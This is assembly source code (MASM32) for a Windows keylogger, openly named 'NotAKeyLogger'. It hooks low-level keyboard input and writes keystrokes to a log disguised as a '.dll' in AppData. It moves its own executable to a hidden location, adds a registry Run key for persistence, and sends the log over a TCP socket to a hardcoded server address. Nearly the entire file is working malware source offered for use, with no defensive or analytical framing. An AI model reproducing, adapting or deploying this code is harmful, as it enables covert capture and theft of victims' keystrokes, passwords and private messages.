include D:\masm32\include\masm32rt.inc
include D:\masm32\include\ws2_32.inc
includelib D:\masm32\lib\ws2_32.lib

;~~~~~~~~~~~Prototypes~~~~~~~~~~~~~~~~~~~~
WriteToFile PROTO : DWORD
MakeOrOpenFile PROTO
WriteSpecialKeyToFile PROTO : DWORD
WinMain PROTO 
CheckPowerButton PROTO
CompareStrings PROTO : DWORD, : DWORD
InstallHook PROTO : DWORD
UninstallHook PROTO
Process32Next PROTO : DWORD, : DWORD
Process32First PROTO : DWORD, : DWORD
FillSocketAddress PROTO : DWORD
SendFileToServer PROTO
CreateSocket PROTO
ConnectSocket PROTO : DWORD
SendFileThroughSocket PROTO : DWORD
CleanSocket PROTO
WriteLaunchTimeToFile PROTO
MoveExecutableFileToOtherLocation PROTO
CreateRegistryKey PROTO
SetPathLocationsForFiles PROTO
CheckIfSameProcessExists PROTO
GetStringLength PROTO : DWORD
WriteByteByByteToBuffer PROTO : DWORD, : DWORD, : DWORD
ClearFile PROTO
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

;~~~~~~~~~~~~~Globals~~~~~~~~~~~~~~~~~~~~
.DATA
exeLocationFirstPart db 'C:\Users\', 0
exeLocationSecondPart db '\AppData\Local\NotAKeyLogger.exe', 0
logLocationSecondPart db '\AppData\Local\NotALogOfKeyLogger.dll', 0 
processName db 'NotAKeyLogger.exe', 0
newLine db " ", 13, 10, 0
autoKey db 'Software\Microsoft\Windows\CurrentVersion\Run', 0
value db 'NotAKeyLogger', 0
caps db '(CP)', 0
powerButton db '(PB)', 0

creation db 'crea', 0
sending db 'send', 0
reading db 'read', 0
writing db 'writ', 0
creationtwo db 'cre2', 0

LPSYSTEMTIME STRUCT
    wYear			 WORD ?
    wMonth			 WORD ?
    wDayOfWeek  WORD ?
    wDay				 WORD ?
    wHour			 WORD ?
    wMinute	       	 WORD ?
    wSecond        WORD ?
    wMilliseconds  WORD ?
LPSYSTEMTIME ENDS
localTime LPSYSTEMTIME <>
date_buf   db 50 dup (32)
time_buf   db 20 dup (32)																													
dateformat db "dddd, MMMM, dd, yyyy", 0																						;struct for datetime
timeformat db "hh:mm:ss tt", 0
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

;~~~~~~~~~~~~~~~~~~BSS~~~~~~~~~~~~~~~~
.DATA?
userName db 32 dup (?)
exeLocation dd 100 dup (?)
logLocation db 100 dup (?)
hInstance dd ?
hookInstance dd ?
fileDescriptor HANDLE ?
hHook dd ?
programInstance dd ?
fileLocationBuffer db 1000 dup(?)
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

.CODE
MAIN:
						call					Start
						INVOKE				ExitProcess, 0																				;not needed, but in case if mystery gonna happen, then program will not crash with err message
;**************** All Steps For Program, One By One *******************
Start PROC
						call				CheckIfSameProcessExists
						call				SetPathLocationsForFiles
						call				CreateRegistryKey
						call				MoveExecutableFileToOtherLocation
						call				MakeOrOpenFile
						call				WriteLaunchTimeToFile
						call				SendFileToServer
						call				WinMain																						   ;key logging starts here
						ret																													   ;ret not needed here, but VS complains

Start ENDP

;***************** Stay As Background Process ************************
WinMain PROC 
LOCAL			msg:MSG

					    INVOKE			InstallHook, hInstance
MessagePump:  
						INVOKE			GetMessage, ADDR msg, NULL, 0, 0
						cmp				eax, 0
						je					MessageEnd
						INVOKE			TranslateMessage, ADDR msg
						INVOKE			DispatchMessage, ADDR msg
						jmp				MessagePump																					;loop to keep alive	
MessageEnd:    
					    ret

WinMain ENDP

;***********************Checks If Instance Of Keylogger Already Runs***************
CheckIfSameProcessExists PROC
LOCAL			hProcessSnap:HANDLE 
LOCAL			process:PROCESSENTRY32

						INVOKE			Sleep, 10000																						;small break to wait until all processes will be launched (prevents duplicates during windows startup)
						INVOKE			CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0							;snapshot of all running processes
						mov				hProcessSnap, eax
						mov				process.dwSize, SIZEOF process
						INVOKE			Process32First, hProcessSnap, ADDR process										;check if something exists in snapshot
						test				eax, eax
						je					ContinueExec	
						lea				ebx, processName																				;our process name

LoopOverProc:	
						INVOKE			Process32Next, hProcessSnap, ADDR process
						cmp				eax, ERROR_SUCCESS
						je					ContinueExec
						cmp				eax, ERROR_NO_MORE_FILES 
						je					ContinueExec			
						lea				esi, [ebx]																							;no more processes, and our was not found as well
						lea				edi, [process.szExeFile]
						mov				ecx, 17
						repz				cmpsb 
						jnz				LoopOverProc																						;not equal
						call				GetCurrentProcessId																			;check if found process is not our launched one
						cmp				eax, process.th32ProcessID
						je					LoopOverProc
						INVOKE			ExitProcess, 0																					;if not, then exit 
ContinueExec:
						ret


CheckIfSameProcessExists ENDP

;**********************Sets Paths For Key Files, That Are Used By Program*****
SetPathLocationsForFiles PROC

						push				32
						mov				esi, esp
						INVOKE			GetUserName, ADDR userName, esi
						pop				ecx
						INVOKE			WriteByteByByteToBuffer, ADDR exeLocationFirstPart, ADDR userName, ADDR exeLocation			;C:\Users\ + username
						INVOKE			WriteByteByByteToBuffer, ADDR exeLocation, ADDR exeLocationSecondPart, ADDR exeLocation	;previous + \AppData\Local\NotAKeyLogger.exe
						INVOKE			WriteByteByByteToBuffer, ADDR exeLocationFirstPart, ADDR userName, ADDR logLocation			;C:\Users\ + username
						INVOKE			WriteByteByByteToBuffer, ADDR logLocation, ADDR logLocationSecondPart, ADDR logLocation		;previous + \AppData\Local\NotAKeyLogger.dll
						ret
						
SetPathLocationsForFiles ENDP

;******************Make Or Open File***********************************
MakeOrOpenFile PROC 

						INVOKE			CreateFile, ADDR logLocation, GENERIC_ALL, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
						mov				fileDescriptor, eax
						ret

MakeOrOpenFile ENDP

;********************Recreate File, Clear Contents***********************
ClearFile PROC

						INVOKE			CreateFile, ADDR logLocation, GENERIC_ALL, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
						mov				fileDescriptor, eax
						ret

ClearFile ENDP

;***************Write Local Time + Date Of When EXE Launched*************
WriteLaunchTimeToFile PROC

						INVOKE			GetLocalTime, ADDR localTime
						INVOKE			GetDateFormat, 0, 0, ADDR localTime, ADDR dateformat, ADDR date_buf, 50
						mov				ecx, OFFSET date_buf
						add				ecx, eax
						mov				BYTE PTR [ecx - 1], " "
						INVOKE			GetTimeFormat, 0, 0, 0, ADDR timeformat, ecx, 20
						lea				ecx, date_buf
						INVOKE			WriteToFile, ecx
						lea				edx, newLine 
						INVOKE			WriteToFile, edx
						ret

WriteLaunchTimeToFile ENDP

;***********Concats Two String Into One And Writes Result To Buffer***************
WriteByteByByteToBuffer PROC firstPart:DWORD, secondPart:DWORD, buffer:DWORD

						INVOKE			GetStringLength, firstPart		;length of first string
						mov				ebx, ecx 
						mov				esi, firstPart							;pointer to first part
						mov				edi, buffer								;pointer to buffer«
Loop1:
						mov				al, BYTE PTR [esi + ecx]			;taking last char from end of  string
						mov				BYTE PTR [edi + ecx], al			;moving that char to the end of buffer, which already contains first part
						dec				ecx
						cmp				ecx, 0FFFFFFFFh						;if less than 0
						jne				Loop1
NextStep:
						push				edi
						INVOKE			GetStringLength, secondPart   ;length of second string
						pop				edi
						add				ebx, ecx								;length of buffer with two strings»»»
						mov				esi, secondPart						;pointer to second part
Loop2:
						mov				al, BYTE PTR [esi + ecx]			;taking last char from end of string
						mov				BYTE PTR [edi + ebx], al			;moving that char to the end of buffer, which already contains first part
						dec				ebx										;decrease counter and repeat
						dec				ecx
						cmp				ecx, 0FFFFFFFFh						;if less than 0
						jne				Loop2
Exit:
						ret

WriteByteByByteToBuffer ENDP

;***************Get Exact Length Of String**********************************
GetStringLength PROC stringAddr:DWORD

						mov				edi, stringAddr						 ;text to get length from
						xor				eax, eax								 ;contains value to compare with
						or					ecx, 0FFFFFFFFh						 ;getting max value
						cld															 ;cls dir flag
						repne scasb												 ;repeat scan string (decreases ecx)
						not				ecx										 ;+ to -
						add				ecx, 0FFFFFFFFh						 ;getting count as normal positive number		
						ret

GetStringLength ENDP

;***************Get EXE Location And Move To Other Directory***************
MoveExecutableFileToOtherLocation PROC

						INVOKE			GetModuleFileName, hInstance, OFFSET fileLocationBuffer, MAX_PATH
						INVOKE			MoveFile, ADDR fileLocationBuffer, ADDR exeLocation
						ret

MoveExecutableFileToOtherLocation ENDP

;**************Create Registry Key For Self Startup************************
CreateRegistryKey PROC
LOCAL			hKey:DWORD 
						
						INVOKE			RegCreateKeyEx, HKEY_CURRENT_USER, ADDR autoKey, 0, 0, 0, KEY_ALL_ACCESS, 0, ADDR hKey, 0
						INVOKE			lstrlen, ADDR exeLocation
						INVOKE			RegSetValueEx, hKey, ADDR value, 0, REG_SZ, ADDR exeLocation, eax
						mov				eax, 1
						ret				

CreateRegistryKey ENDP																		 

;******************Write To File**************************************
WriteToFile PROC msg:DWORD
LOCAL	nBytes:DWORD

						mov			edi, msg																							 ;get length of string to write in file
						xor			ecx, ecx
						xor			al, al				
						not			ecx
						cld
						repne		scasb
						not			ecx
						dec			ecx
						INVOKE		WriteFile, fileDescriptor, [msg], ecx, ADDR nBytes, 0								;keys are logging one by one
						ret

WriteToFile ENDP

;*******************Install Hooks************************************
InstallHook PROC pInst:DWORD

						push			pInst
						pop			programInstance
						lea			ecx, LowLevelKeyboardProc
						INVOKE		SetWindowsHookEx,  WH_KEYBOARD_LL, ecx, hookInstance, 0
						mov			hHook, eax
						ret

InstallHook ENDP

;*******************Uninstall Hooks**********************************
UninstallHook PROC

						INVOKE			UnhookWindowsHookEx, hHook
						ret

UninstallHook ENDP

;******************Main Event Hook**********************************
LowLevelKeyboardProc PROC nCode:SDWORD, wParam:DWORD, lParam:DWORD

									mov			eax, nCode
									cmp			eax, 0FFFFFFFFh																	;check if neg number
									jge			CheckParams
									jmp			PostFailCallNextHook
CheckParams:				
									mov			eax, lParam
									and			eax, 8000000h																	;getting 31 bit to check repeat count
									test			eax, eax
									jnz			PostFailCallNextHook
									mov			eax, wParam
									cmp			eax, WM_KEYDOWN												
									je				CheckIfKeyIsSpecial 
									cmp			eax, WM_SYSKEYDOWN											
									je				CheckIfKeyIsSpecial       	
									jmp			PostFailCallNextHook
CheckIfKeyIsSpecial:		
									call			CheckCapital
									test			eax, eax
									jnz			WriteCapsLockKey
									INVOKE		CheckPowerButton
									test			eax, eax
									jnz			WritePowerButton
									jmp			WriteKey
WriteCapsLockKey:			
									INVOKE		WriteToFile, OFFSET caps
									jmp			WriteKey
WritePowerButton:			
									INVOKE		WriteToFile, OFFSET powerButton
									INVOKE		ExitProcess, 0																	;can be modified later
WriteKey:						
									INVOKE		WriteToFile, lParam
									;PostSuccessCallNextHook will be called, everything is fine (even if we couldn't write character to file)
PostSuccessCallNextHook:						
									INVOKE		CallNextHookEx, hHook, nCode, WM_KEYUP, lParam				;called on success
									ret
PostFailCallNextHook:				
									INVOKE		CallNextHookEx, hHook, nCode, wParam, lParam					;called on fail
									ret

LowLevelKeyboardProc ENDP

;**************Check If Capital Key Is Pressed***************************
CheckCapital PROC
									xor			esi, esi
									INVOKE		GetKeyState, VK_CAPITAL
									test			eax, eax
									jnz			Exit
									INVOKE		GetAsyncKeyState, VK_SHIFT
									or				eax, esi
Exit:								ret

CheckCapital ENDP

;**************Check If Power Button Was Pressed************************
CheckPowerButton PROC 

									INVOKE		GetKeyState, VK_SLEEP
									ret

CheckPowerButton ENDP

;**************Sends File To Server************************************
SendFileToServer PROC
LOCAL				sockAddr:sockaddr_in
LOCAL			    wsaData:WSADATA
REQ_WINSOCK_VER equ 2

						INVOKE			   WSAStartup, REQ_WINSOCK_VER, ADDR wsaData					   ;setting "behind scene" stuff for winsocks 
						test				   eax, eax
						jnz				   Exit
						cmp				   BYTE PTR [wsaData.wVersion], REQ_WINSOCK_VER			       ;if major version (low byte) is at least REQ_WINSOCK_VER
						jb					   Exit
						INVOKE			   FillSocketAddress, ADDR sockAddr
						INVOKE			   CreateSocket
						cmp				   eax, INVALID_SOCKET
						je					   Exit
						mov				   edx, sizeof sockAddr
						INVOKE			   ConnectSocket, ADDR sockAddr
						test				   eax, eax
						jne				   Exit
						INVOKE			   SendFileThroughSocket, ebx
Exit:					
						INVOKE			   CleanSocket
						ret
						

SendFileToServer ENDP

;******************************************************************
;****************SOCKET SECTION************************************
;******************************************************************

;***************Fill Address Info**************************************
FillSocketAddress PROC sockAddr:DWORD

						mov					eax, 3232258095																				;ip 192.168.88.47 (or whatever private/public u have)
						bswap				eax																									;to net order

						mov					ecx, 1be9h																							;port 7145 (or whatever u have)
						xchg					cl, ch																									;to net order

						mov					edx, [sockAddr]
						mov					[edx][sockaddr_in.sin_family], AF_INET
						mov					[edx][sockaddr_in.sin_port], cx
						mov					[edx][sockaddr_in.sin_addr.S_un.S_addr], eax
					    ret

FillSocketAddress ENDP

;****************Create Socket***************************************
CreateSocket PROC

						INVOKE				socket, AF_INET, SOCK_STREAM, IPPROTO_TCP
						mov					ebx, eax
						ret

CreateSocket ENDP

;*************Connect Socket****************************************
ConnectSocket PROC sockAddr:DWORD
LOCAL			socketDescriptor:DWORD
LOCAL			sizeOfAddrStruct:DWORD
	
						mov					[socketDescriptor], ebx																		;reg overwritten after connect
						mov					[sizeOfAddrStruct], edx																		;reg overwritten after connect
						mov					edi, 5																								;max try count = 5

Connect:
						INVOKE				connect, socketDescriptor, sockAddr, sizeOfAddrStruct
						test					eax, eax
						jz						Exit

CheckErrors:
						call					GetLastError
						cmp					eax, WSAENETUNREACH																		;unreachable (mostly because of no internet connection)
						je						TryAgainAfterAWhile

CanErrorBeIgnored:
						cmp					eax, WSAEISCONN																				;connection is made on existing one
						je						ResetError
						cmp					eax, WSA_IO_PENDING																		;operation in process/pending
						je						WaitBeforeContinuing
						cmp					eax, WSAEADDRINUSE																		;address in use
						je						ResetError

TryAgainAfterAWhile:
						INVOKE				Sleep, 10000																						;sleep for 10 seconds before trying again
						dec					edi
						test					edi, edi			
						jnz					Connect
						jmp					Exit

WaitBeforeContinuing:
						INVOKE				Sleep, 10000

ResetError:		
						xor					eax, eax
Exit:					
						ret

ConnectSocket ENDP

;************Send File With Socket************************************  
SendFileThroughSocket PROC  socketDescriptor:DWORD
LOCAL			fileTransferBuffer:DWORD
LOCAL			bytesRed:DWORD
LOCAL			bytesToRead:DWORD

						;reopening handle to save contents, otherwise data that was written in opened file will be in binary format ('\0\0\0\0' on server side)
						INVOKE				CloseHandle, fileDescriptor																	
						call					MakeOrOpenFile
						mov					fileDescriptor, eax
						INVOKE				GetFileSizeEx, fileDescriptor, ADDR bytesToRead
						test					eax, eax
						jz						RecreateIfBigFile
						INVOKE				VirtualAlloc, NULL, bytesToRead, MEM_COMMIT, PAGE_READWRITE
						mov					fileTransferBuffer, eax
						INVOKE				ReadFile, fileDescriptor, fileTransferBuffer, bytesToRead, bytesRed, 0
						test					eax, eax
						jz						RecreateIfBigFile						
						INVOKE				send, socketDescriptor, fileTransferBuffer, bytesToRead, 0
RecreateIfBigFile:
						cmp					[bytesToRead], 4000000000d																;4 MB 
						jb						Exit
						INVOKE				CloseHandle, fileDescriptor
						call					ClearFile
Exit:
						ret				

SendFileThroughSocket ENDP

;***********Socket Post-Cleanup*************************************
CleanSocket PROC

						cmp					ebx, INVALID_SOCKET
						je						Clean																									;skip close if socket was not created
Close:		
						INVOKE				closesocket, ebx
Clean:				
						INVOKE				WSACleanup
						xor					ebx, ebx
						ret

CleanSocket ENDP

END MAIN